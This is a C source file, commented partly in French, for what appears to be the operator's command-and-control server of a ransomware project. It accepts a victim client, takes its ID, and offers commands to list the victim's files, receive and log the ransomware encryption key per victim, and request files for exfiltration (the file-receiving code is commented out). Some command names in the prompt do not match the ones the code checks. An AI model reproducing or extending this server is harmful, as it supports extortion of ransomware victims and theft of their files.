#include "common.h"
#include "serveur.h"

#define SERVER_PORT 8081
#define ID_LENGTH 8
#define LOG_FILE "server_log.txt"

void printServerBanner() {
    printf("  ________  ______   _____  __  _______\n");
    printf("  / ___/ _ \\/ ___/ | / / _ \\/ / / / ___/\n");
    printf(" (__  )  __/ /   | |/ /  __/ /_/ / /    \n");
    printf("/____/\\___/_/    |___/\\___/\\__,_/_/     \n");
    printf("\n");
}

void handleClient(my_socket_t clientSocket) {
    char clientMessage[1024];
    char serverCommand[1024];
	char filePath[256];
	char fichier[256];
	char buffer[1024];
	char encryptionKey[128];
	//-------------------------------------------
	// Reception de l'identifiant du client
    char clientId[ID_LENGTH + 1] = {0};
    int bytesReceived = recv(clientSocket, clientId, ID_LENGTH, 0);
    if (bytesReceived <= 0) {
        printf("Erreur de reception de l'id client.\n");
        return;
    }
    clientId[bytesReceived] = '\0'; // Terminer la chaîne
    printf("Identifiant du client recu : %s\n", clientId);
	//--------------------------------------------
    while (1) {
        printf("Enter a command to send to the client (run_list, run_encrypt, exit): ");
        scanf("%s", serverCommand);

        if (send(clientSocket, serverCommand, (int)strlen(serverCommand), 0) < 0) {
            printf("Failed to send command.\n");
            break;
        }

        if (strcmp(serverCommand, "exit") == 0) {
            printf("Disconnecting client.\n");
            break;
        }
//-------------------LIST-------------------------------
        if (strcmp(serverCommand, "list") == 0) {
            printf("Receiving file list from client...\n");
            char *line;
            while (1) {
                memset(clientMessage, 0, sizeof(clientMessage));
                int bytesReceived = recv(clientSocket, clientMessage, sizeof(clientMessage) - 1, 0);
                if (bytesReceived <= 0) {
                    printf("Connection ferme ou erreur\n");
                    return;
                }

                clientMessage[bytesReceived] = '\0'; // Terminaison de chaîne
                line = strtok(clientMessage, "\n");  // Decoupe en lignes
                while (line != NULL) {
                    if (strcmp(line, "END_OF_LIST") == 0) {
                        printf("End of file list received.\n");
                        break;
                    }
                    printf("File: %s\n", line);
                    line = strtok(NULL, "\n");
                }
                if (line && strcmp(line, "END_OF_LIST") == 0) {
                    break;
                }
            }
            printf("Ready for the next command.\n");
            continue;
        }
//-----------------------RANSOMWARE--------------------
		if (strcmp(serverCommand, "ransomware") == 0) {
            printf("Receiving encryption key from client...\n");
            memset(encryptionKey, 0, sizeof(encryptionKey));

            // Reception de la cle de chiffrement
            bytesReceived = recv(clientSocket, encryptionKey, sizeof(encryptionKey) - 1, 0);
            if (bytesReceived <= 0) {
                printf("Erreur de reception de la cle de chiffrement.\n");
                continue;
            }
            encryptionKey[bytesReceived] = '\0'; // Terminer la chaîne
            printf("Encryption key received: %s\n", encryptionKey);

            // Stockage de la cle dans le fichier de log
            FILE *logFile = fopen(LOG_FILE, "a");
            if (logFile) {
                fprintf(logFile, "Client ID: %s, Key: %s\n", clientId, encryptionKey);
                fclose(logFile);
                printf("Encryption key stored in %s\n", LOG_FILE);
            } else {
                printf("Erreur: impossible d'ouvrir le fichier de log %s\n", LOG_FILE);
            }

            // Supprimer la cle apres utilisation
            memset(encryptionKey, 0, sizeof(encryptionKey));
            printf("Encryption key deleted from memory.\n");
            continue;
        }

        memset(clientMessage, 0, sizeof(clientMessage));
        if (recv(clientSocket, clientMessage, sizeof(clientMessage), 0) < 0) {
            printf("Failed to receive acknowledgment.\n");
            break;
        }
        printf("Client response: %s\n", clientMessage);
//-----------------------EXFILTRATION--------------------
		if (strcmp(serverCommand, "exfiltration") == 0) {
			printf("Entrer le fichier à lire");
			scanf("%s",fichier);
			send(clientSocket, fichier, sizeof(fichier),0);
			printf("OK");
			/*
			//send(clientSocket, fichier, strlen(fichier), 0);
			if (send(clientSocket, fichier, strlen(fichier), 0) <= 0) {
				printf("Erreur lors de l'envoi du nom de fichier au client.\n");
				return;
			}
			printf("Fichier recu : %s\n", fichier);
			FILE *outFile = fopen(fichier, "w");
			if (outFile == NULL) {
				printf("Erreur: impossible de creer le fichier %s\n", fichier);
				break;
			}
			while (1) {
				memset(buffer, 0, sizeof(buffer));
				recv(clientSocket, buffer, sizeof(buffer), 0);
				int bytesReceived = recv(clientSocket, fichier, sizeof(fichier), 0);
				if (bytesReceived <= 0) {
					printf("Erreur lors de la reception du nom de fichier.\n");
					break;
				}
				if (strcmp(buffer, "END_OF_FILE") == 0) break;
				fwrite(buffer, 1, bytesReceived, outFile);
			}
			fclose(outFile);
			printf("Fichier enregistre : %s\n", filePath);
			*/
		}
        memset(clientMessage, 0, sizeof(clientMessage));
        if (recv(clientSocket, clientMessage, sizeof(clientMessage), 0) < 0) {
            printf("Failed to receive acknowledgment.\n");
            break;
        }
        printf("Client response: %s\n", clientMessage);
	}
}

int main() {
    printServerBanner();

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return 1;
    }
#endif

    my_socket_t serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET_VALUE) {
        perror("Socket creation failed");
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Socket created successfully.\n");
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(SERVER_PORT);

    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR_VALUE) {
        perror("Bind failed");
#ifdef _WIN32
        printf("WSA Error Code: %d\n", WSAGetLastError());
#endif
        closesocket(serverSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Bind successful on port %d.\n", SERVER_PORT);
    }

    if (listen(serverSocket, 3) == SOCKET_ERROR_VALUE) {
        perror("Listen failed");
#ifdef _WIN32
        printf("WSA Error Code: %d\n", WSAGetLastError());
#endif
        closesocket(serverSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Listening on port %d...\n", SERVER_PORT);
    }

#ifdef _WIN32
    int clientAddrLen = sizeof(clientAddr);
#else
    socklen_t clientAddrLen = sizeof(clientAddr);
#endif

    clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &clientAddrLen);
    if (clientSocket == INVALID_SOCKET_VALUE) {
        perror("Accept failed");
#ifdef _WIN32
        printf("WSA Error Code: %d\n", WSAGetLastError());
#endif
        closesocket(serverSocket);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    } else {
        printf("Client connected successfully.\n");
    }

    handleClient(clientSocket);

    closesocket(clientSocket);
    closesocket(serverSocket);

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
